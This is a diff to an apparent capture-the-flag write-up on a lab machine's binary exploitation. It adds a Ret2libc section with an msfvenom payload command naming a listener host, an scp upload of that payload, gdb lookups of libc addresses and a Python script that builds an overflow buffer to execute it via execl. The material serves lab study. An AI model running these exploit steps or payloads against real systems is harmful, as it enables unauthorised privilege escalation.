@@ -393,7 +393,7 @@ setread = b'\x07\x00\x00\x00'
 
 
 buf = b""
-buf += scode.ljust(76, "\x90") # ljust sets a fixed length buffer, regardless of payload length and writes our rop chain, the padding is \x90=nop
+buf += scode.ljust(76, b"\x90") # ljust sets a fixed length buffer, regardless of payload length and writes our rop chain, the padding is \x90=nop
 buf += mprotect
 buf += struct.pack("<L", ret_address)
 buf += stackadd
@@ -403,3 +403,64 @@ buf += setread
 with open('tmpbuf','wb') as buffef:
 	buffef.write(buf)
 ```
+
+## Ret2libc
+
+(1) libc_execl->libc_exit->pointer_path_to_bin->NULL->NULL
+
+Generate shellcode:
+
+> msfvenom -p linux/x86/exec CMD=/bin/bash LHOST=10.10.15.174 LPORT=443 PrependSetuid=true -f elf -o booj.elf
+
+Send it to the box:
+
+> scp booj.elf xalvas@10.10.10.27:/tmp
+
+Find the function we need:
+
+> gdb-peda$ p execl
+>> $1 = {<text variable, no debug info>} 0xb7ecaa80 <__GI_execl>
+> gdb-peda$ p exit
+>> $2 = {<text variable, no debug info>} 0xb7e489d0 <__GI_exit>
+
+The `execl` function usage:
+
+```c
+int execl(const char *path, const char *arg0,
+     ...  /* const char *argn, NULL */);
+```
+
+Since it requested args, but we don't need them, just pass NULL into it.
+
+But it may leads to problem, however, it use `copy()` with `fread()`, so it's not going to be a problem here.
+
+
+In this way, the exploit should be like this:
+
+```python
+#!/usr/bin/env python3
+import struct
+
+ret_address = struct.pack('<I',0xbffff540) # replace this with vulnaddr
+
+tmpbooj = b"/tmp/booj.elf\x00\x00\x00"
+execl = struct.pack("<L", 0xb7ecaa80)
+exit = struct.pack("<L", 0xb7e489d0)
+
+buf = b""
+buf += tmpbooj.ljust(76, b'\x90')
+buf += execl
+buf += exit
+buf += ret_address
+buf += struct.pack("<L", 0x0)
+buf += struct.pack("<L", 0x0)
+
+with open('tmpbuf','wb') as buffef:
+	buffef.write(buf)
+```
+
+(2) Why not `system()` ?
+
+`system` can be broken down into three function calls `fork`, `exec` and `wait`. So the entire process memory is forked and the given file is then run. The issue with [this](https://stackoverflow.com/questions/32892908/c-system-raises-enomem?noredirect=1&lq=1) is we’re liable to run out of virtual memory if we use this. Give it a try if you want and you’ll see that the exploitation fails. If you do manage to get it working, let me know.
+
+(END) 2019.6.10
